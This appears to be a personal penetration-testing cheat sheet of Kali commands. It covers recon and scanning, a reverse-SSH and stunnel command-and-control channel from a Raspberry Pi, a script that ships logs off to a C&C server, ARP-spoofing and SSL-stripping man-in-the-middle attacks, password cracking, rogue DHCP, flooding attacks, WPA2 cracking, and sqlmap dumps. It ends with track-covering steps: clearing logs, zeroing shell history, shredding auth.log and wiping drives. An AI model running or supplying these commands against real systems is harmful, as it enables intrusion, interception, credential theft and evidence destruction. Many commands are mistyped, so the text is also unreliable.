--------------------------------------------
WHOis
--------------------------------
whois -H google.com
whois -H 216.58.218.238
whois -h whois.radb.net -- '-i origin AS36856' | grep route
------------------------------------------------------------
dnsmap
dnsmap mozilla.org
----------------------------------------
DNSRecon
dnsrecon -d cnn.com -g
dnsrecon -d mozilla.org
---------------------------------
DNS BIND version command
host -c chaos -t txt version.bind DNS1.xxxx.NET
---------------------------------------------------
NMAP
namp -v -A scanme.nmap.org
nmap -v -sn 192.168.0.0/16 10.0.0.0/8
nmap -v -iR 10000 -Pn -p 80
nmap -v -sS -sV -p0-65535 192.168.1.129
nmap -sU --min-rate 5000 192.168.1.129
nmap -p22,80,443,8888 -T4 192.168.1.129
nmap -sC -p22,80,443,8888 -T4 192.168.1.129
nmap -sU -p53 -script=dns-recursion HOST
nmap -sU -p53 --script=dns-recursion NS.xxx.NET
nmap -sU -p53 --script=dns-recursion 1.xxx.xxx.xxx
-----------------------------------------------------------
P0f
P0f -h
p0f -i eth0 'port 3389'
p0f -i -r ssh.pcap
---------------------------------------------------------
Firewalk
firewalk
firewalk -pTCP -S22,23,25,80,443,5900,8080,8443 192.168.1.1 192.168.30.250	

---------------------------------------------------------------
waf
wafw00f http://amazon.com
waf00f http://cnn.com
-----------------------------------
./dotdotpwn.pl
dotdotpwn-mhttp-c3-h192.168.1.134
------------------------------------
netdiscover

netdiscover 192.168.111.1/24
----------------------------------
tcpdump
tcpdump -n arp
-------------------------------
#copy old keys and create new ones
commands and control setup
mkdir backup-keys
mv ssh_host_*backup-keys/
dpkg-reconfigure openssh-server

#change permission to root login
/etc/ssh/
vim sshd_config
PermitRootLogin yes

#SSH start up on BOOT
update-rc.d -f ssh enable 2 3 4 5
#restrat ssh server
service ssh restarart
...............................
# my configuration for setting up the reverse SSH tunnel:
-R to redirect the port
ssh -R 8022:localhost:22 mycandcserver.mydomain.com
ssh -p 8022 localhost
----------------------------
#generating ssh-keygen on pi
ssh-keygen -t rsa -b 4096
---------------------------
copying id_rsa.pub file to C&C server
cd .ssh/
scp root@pi-kali:/root/.ssh/id_rsa.pub authorization_keys
----------------------------------------------

#run ssh at startup
cd /etc/network/ip-up.d/
touch outbound-ssh
chmod +x outbound-ssh
vi outbound-ssh
#create script 
#!/bin/sh
su -c "/usr/bin/ssh -p 8888 -f -N -R 8022:127.0.0.1:22 localhost"
-------------------------------------------------------------
Stunnel
#certifcate for encryption between clinet and server
openssl genrsa 2048 > /etc/stunnel/stunnel.key
openssl req -new -key /etc/stunnel/stunnel.key -x509 -days 200 -out /etc/stunnel/stunnel.crt
cat /etc/stunnel/stunnel.crt /etc/stunnel/stunnel.key > /etc/stunnel/stunnel.pem

#enable stunnel
cat stunnel4
ENABLED=1

#parmeter set 
client = no

#set parameter cert path
cert = /PATH/TO/CERT

#set parameter for port and ip
Accept = 192.168.33.27:443

#set connect parameter
Connect = 127.0.0.1:22

#restart the service

service stunnel4 restart

----------------------------
setup stunnel at reberry pi
cat /etc/stunnel/stunnel.conf
cert = /etc/stunnel/stunnel.pem
clinet = yes
accept = 127.0.0.1:8888
connect = 192.168.33.27:443

 
#restart the service
service stunnel4 restart

#change enable stunnel to startup
ENABLE = 1


verifyinh automation

tcpdump host 192.168.33.123

tcpdump host 192.168.33.123 and host not 192.168.33.3	

#ssh command to use revrse tunnel on raspberry pi
Ssh -p 8022 localhost

----------------------------------------------------------
#create evidence folder
cd /var
mkdir evidence
touch evidence/LOG
chmod +w evidence/LOG
ls -al evidence/LOG
---------------------------
#create script in /root/scripts/
cat /root/scripts/transfer.sh
#!/bin/sh
#Generate file name on Timestamp
TIMESTAMP=$(date + "Y%m%d%H%M%S");
LOGFILE ="$TIMESTAMP-$1.log";
#copy file over evidence server
/usr/bin/scp $1 root@CCserver:/evidence/$LOGFILE
#
# Move file into evidence folder with backup extension 
/bin/mv $1 /var/evidence/$LOGFILE-bkup
#
# Write file transfer log file
#
/bin/echo "Wrote $LOGFILE to C&C server" >> /var/evidence/LOG

#
# Exit file
#
exit 0;

--------------------------------------------------------
#run script against logs
mkdir /evidence
ls -al / | grep evidence
/root/scripts/transfer.sh kern.log
/root/scripts/transfer.sh user.log
/root/scripts/transfer.sh dpkg.log

----------------------------------------
#entry from log file
/root/scripts/transfer.sh lastlog
----------------------------------------------
File utilites 
tar
tar -zcvf <newfilename.tar.gz> <filetobecompressed>
#example
jabeltra$ tar -zcvf system.log.tar.gz system.log a system.log
#here is syntax to decompress file
tar -xvf <compressed file>
#tar -xvf system.log.tar.gzx ./._system.log
x system.log

split utility

split the log file in 4 size
split -b <size k|m> <filetobesplit> <nameofsplitfiles>

jabeltra$ cat system.log.splitaa system.log.splitab system.log.splitac system.log.splitad > system.log
jabeltra$ ls -al | grep system.log

#concanate file together
ccat <fileaa fileab fileac filead> > <final file name>

#check serive status
netstat -antp

-------------------------------------
TCP DUMP
tcp dump host 192.168.1.1

tcpdump host www.mytarget.com

#specify src and destination
tcpdump 'src 192.168.12.242 and dst 192.168.31.150'

#specify whole network
tcpdump net 192.168.30.0/24

#specify the host using /32
tcpdump net 192.168.33.3/32

#specify the portocol
tcpdump tcp
tcpdump port 22
tcpdump dst port 22
tcpdump 'tcp and dst port 22'
tcpdump 'tcp and dst port 22 and src port 53029'
tcdump 'tcp and src port 22 and net 192.168.1.0/24'

#record the traffic
tcpdump -w SSHcap.pcap 'tcp and dst port 22 and src port 53029 net 192.168.1.0/24'

#read the captured traffic
tcpdump -r SSHcap.pcap

#tcpdump on network. -n flag as dont wanna IPs or port resolve

sudo tcpdump -n -i en0 not port 22
----------------------------------------------
Windump
Windump is the tcpdump of windows.
this tools is very handy if you wanna capture traffic from windows box directly.

windump -?
windump -n not port 3389
windump -w Win8.pcap
#captured file reading in os x
tcp dump -n -r win8.pcap

---------------------------------------
wireshark
--------------------------------------------
ARP spoofing
-------------------------------------------------
apt-get install dsniff
sysctl
#enable IP forwarding
sysctl -w net.ipv4.ip_forward = 1
#verfiy setting
sysctl -a list | grep ipv4.ip_forward net.ipv4.ip_forward = 1
#tell fefault gateway yo send the traffic to me
arpspoof -i eth0 -t 192.168.33.1
#tell end host host to send it traffic to my internal host when destined to default gateway
arpspoof -i eth0 -t 192.168.33.3 192.168.33.1
#finally  run tcpdump against port 80 to verify i am seeing bidirectional traffric on port 80
tcp -n port 80

---------------------------------------------------------------------------------
Ettercap
-----------------------------------------------------------------------------------
sslstrip
----------------------------------------------------------------------------------------
#SETUP IPTABLE TO redirect that ibound SSL to the port that i will have to sslstrip listening on.
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $LISTEN-PORT 8080
sslstrip -l 8080
arpspoof -i eth0 -t 192.168.33.3 192.168.33.1
#while spoof the default gateway i also spoof the host ip adress to defualt gateway to send the return traffic to me.
arpspoof -i eth0 -t 192.168.33.1 192.168.33.3
#arpsoof and get the tail log
more sslstrip.log
-----------------------------------------------------------
#Intercepting SSL Traffic with ssl spilit
-------------------------------------------------------------
create certificate top perform Mitim attack
----------------------------------------------
openssl genrsa -out aol.key 4096
openssl req -new x509 -days 1826 -key aol.key -out aol.crt

#systl changes and iptable for redirecting
Sysctl -w net.ipv4.ip_forward=1

#redirect any port to which i am listening
iptables -t nat -F
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443

#run ssplit
ssplit -D -l connections.log -j /tmp/ssplit/ -S logdir/ -key aol.key -c aol.crt ssl 0.0.0.0 8443
#arp spoof to direct the trafic to sslstip listeners
#check the credintal in the logs

-------------------------------------------------------
#rainbow crack
------------------------------------------------------------
#syntax
rtgen hash_algorithm charset plaintext_len_min plaintext_len_max
table_index chain_len chain_num part_index

#generating rainbow table
rtgen sha256 loweralpha-numeric 1 7 0 1000 2000 0 rainbow table sha256_loweralpha-numeric#1-7_0_1000*2000_0.rt parameters
#find the rt file created
cd /usr/share/rainbowcrack
rtsort *.rt
------------------------------------
crunching wordlist
#basic syntax
crunch <min-len> <max-len> [<character set>] {options}

crunch 5 8 abcefg12345 -o wordlist.txt
crunch 3 5 -o wordlist.txt
#look the file
cat wordlist.txt | more

-------------------------

online locations
Openwall: http://download.openwall.net/pub/passwords/wordlists/
Hashcat: https://hashcat.net/wiki/doku.php?id=example_hashes
h t t p s ://g i t h u b . c o m /M e b u s /c u p p . g i t .

John the ripper
john [OPTIONS] [PASSWORD-FILES]
#combine shaddow and passwd files into one files
john server-META.txt
#shows account of compromised box
john --show META/server-META.txt
#see all the cracked user that were using as bash shell
john --show --shells=bash META/server-META.txt
-----------------------------------------------------------------------
THC-HYDRA
#hydra syntax
hydra [[[-l LOGIN|-L FILE] [-p PASS|-p FILE]] | [-C FILES]] [-e nsr] [-o FILE] [-t TASK] [-M FILE [-T TASK]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-SOuVd46] [service://server[:PORT] [/OPT]]
here are the option

-l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE
-p PASS or -p FILE try password PASS, or load several passwords from FILE
-C FILE colon separated "login:pass" format, instead of -L/-P options
-M FILE list of servers to attack, one entry per line, ':' to specify port
-t Task run number of connects in parallel (per host, default:16)
-U service module usage details
-h more commadn line options (COMPLETE HELP)
server-the target DNS IP or 192.168.1.1/24 
service- the service to crack the
OPT- some service modules support addtionl input (-U foe module help)

#crack msfadmin password for ssh
hydra -l root -p /usr/share/wordlist/sqlmap.txt 192.168.1.1 ssh

------------------------------------------------------------------------
Ncrack
usgae ncrack [Options] {target and service specification}
ncrack -v -iL host.txt --user root -P generic-passwords.txt -p ssh CL=4
--------------------------------
Medusa
Medusa [-host | -H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
#crack host
medusa -H host.txt -u root -P generic-passwords.txt -M ssh -n 22
-----------------------------------------------------------------
snmp-check -h
snmp-check -c public -v 2c -w 192.168.1.5
-----------------------------------------------
Rouge DHCP server
#setup new interface
ifconfig eth0:1
ifconfig eth0:1 192.168.333.111 netmask 255.255.255.0
route add default gw 192.168.1.1 eth0:1
sysctl -w net.ipv4.ip_forward=1
#setup rouge DHCP server
msfconsole
use auxiliary/server/dhcp
set DHCPIPSTART 192.168..33.205
set DHCPIPEND 192.168.33.207
set srvhost 192.168.33.111
set netmask 255.255.255.0
set router 192.168.33.1.
#exhasut current DHCP server
pig.pyeth0:1
#start rouge server
run
#verify 
ifconfig
#check traffic is traversing to my ox and going to the internet
tcpdump-i eth0:1-nicmp
#Hping
Hping3 -c 30000 -d 120 -s -p 22 -flood 192.168.33.1
-c -Number of packets to send
-d Size of packets tosend
--flood - send the packets as fast as possible
---------------------------------------------------
Lands attack with hping3
--------------------------------------------------
hping -V -c 100 -d 40 -S -p 139 -s 80 -k -a 192.168.1.129 192.168.1.129
-V verbose
-c --count: packet count
-d --data: data size
-s --syn: set SYN flag
-p --destport [+] [+] <port> destination port (default 0) ctrl+z inc/dec
-s --baseport: base source port (default random)
-k -keep source port still
-a -spoof source address	
-----------------------------------------------
Smurf attacks against hping3
hping3-1 --flood -a 192.168.33.1231 192.168.1.255
-1 --icmp: It is ICMP mode
--flood It send packet as fast as possible
-a-spoof: It source address

defending against attack is easy turning directed broadcast oof on switch port and router interfaces within the environment
#interfaceGigabitEthernet0
noipdirected-broadcast
-------------------------------------------
MAC flooding with Macof
-------------------------------
syntax
macof [-i interface] [-s src] [-d dst] [-e tha] [-x sport] [-y dport] [-n times]
#useup all TCAM space
macof -i eth0 -d 192.168.33.1 -n 1000000
#to protect agaisnt MAC flooding attack
interface gi 0/1
switchport mode access
switchport port-security maximum 5
switchport port-security mac-address sticky
----------------------------------------------
Wirless-based attacks
Cracking WPA2 with aircrack-ng
airmon-ng start wlan1
#get the list of wlan
airodump-ng wlan1mon
#setup capture of packets and handshakr using airdump-ng 
airodump-ng-c 1 -wSP-Guest--	
#after packet capture mix it with good wordlist and try to crack the passpharse
aircrack-ng-w /usr/share/wordlists/wifilist.txtSP-Guest-01.cap

#monitoring the airway with kismet

#Attacking WEP wuth wifite
#Bluetooth probing
#Bluelog
#hciconfig
#specify file interface and file to store
bluelog -i hci0 -o /root/bt-log.txt -vnmct
#end scan
ctrl + c
#btscanner
#blueranger
blueranger.sh
bluelog -i hci0 -o /root/bt-log.txt -vmct
#scanning with Hcitool
hcitoolhcitool -HCI Tool ver 5.43
hcitool -i hci0 scan
hcitool -i hci0 info 48:3B:38:EB:5D:9F
#connect to device
sudo rfcomm connect 0 8C:DE:52:1F:F5:07 10 >/dev/null&
#check the RSSI	
hcitool -i hci0 rssi 8C:DE:52:1F:F5:07
#LINK QUALITY
hcitool -i hci0 lq 8C:DE:52:1F:F5:07
#to check the power level of the device
hcitool -i hci0 tpl 8C:DE:52:1F:F5:07
-------------------------------------------------
Webapplication
------------------------------
Reflected XSS
<script>alert("your site is not protecting against XSS")</script>
<script>alert("Bad code")</script>
OWASP ZAP
Infrastructure design weakness
#uniscan remote file include local file include
-q enable directory scan
-w will enbale file scan
-e enable robot.txt and sitemap xml
-d dynamic scan
-s enable static check
uniscan -u http://192.168.33.31/ -qweds
------------------------------------
#skipfish
skipfish -o 202 http://192.168.33.31/dvwa
--------------------------------------------------
Identity-based testing
-------------------------------------------------
role based acces controls
--------------------------
apache-user
apache-user -h 192.168.1.129 -l
wfuzz
wfuzz -b PHPSESSID=55e8ff7e0bec6bfbf3485bb9272f8acc -z file,/usr/share/wfuzz/wordlist/general/user.txt -z file,/usr/share/wfuzz/wordlist/general/user.txt -z http://192.168.33.31/dvwa/vulnerabilites/brute/?username=FUZZ\&password=FUZ2Z\&Login=Login#
----------------------
validating data error handling 
------------------------
SQL INJECTION
----------------------
sqlmap -u "http://192.168.33.31/dvwa/vulnerabilites/sqli/?id=user&Submit=Submit#" --cookie="PHPSESSID=eb6e6cd3ca8532aa5abb6edf879713e7; security=low" --dbs
-------------------------
find sql version
sqlmap -u "http://192.168.33.31/dvwa/vulnerabilites/sqli/?id=user&Submit=Submit#" --cookie="PHPSESSID=eb6e6cd3ca8532aa5abb6edf879713e7; security=low" --f
------------------------------
#banner grappping
sqlmap -u "http://192.168.33.31/dvwa/vulnerabilites/sqli/?id=user&Submit#" --cookie="PHPSESSID=eb6e6cd3ca8532aa5abb6edf879713e7; security=low" -b
#dump table enteries
sqlmap -u "htttp://192.168.33.31/dvwa/vulnerabilities/sqli/?id=user&Submit=Submit#" --
cookie="PHPSESSID=eb6e6cd3ca8532aa5abb6edf879713e7; security=low" --dump
-----------------------------------------------------
Error handling
OWASP ZAP
----------------------------
Session management
------------------------
Burp suite with intercept
------------------------------
#cleaing and getting out
clearev with metasploit
clearev
--------------------------
#shread
shread -help
#shread auth.log
shred -vfzu auth.log
------------------------
Cli tips for hiding tracks
more .bash_history bluesnarfer -r 1-100 -c 13 -b 
#clear bsah file
.bash_history
more .bash_history
#se history size
echo $HISTSIZE 500
export HISTSIZE=0
echo $HISTSIZE 0
more .bash_history
-----------------------------
clearLOGS for windows
Clearlogs as admin
--------------------
using DD and mkfs to clear drive
#write random data on drive
dd if=/dev/urandom of=/dev/sda2
---------------------------------
#reformat paration with newfile system
Mkfs.ext4 /dev/sda2
-------------------
LUKS nuke
---------------------------
Destroying equipment
#Hardware chain of custody
#destruction by the penetration tester

-------------------------------------------
penetration testing report




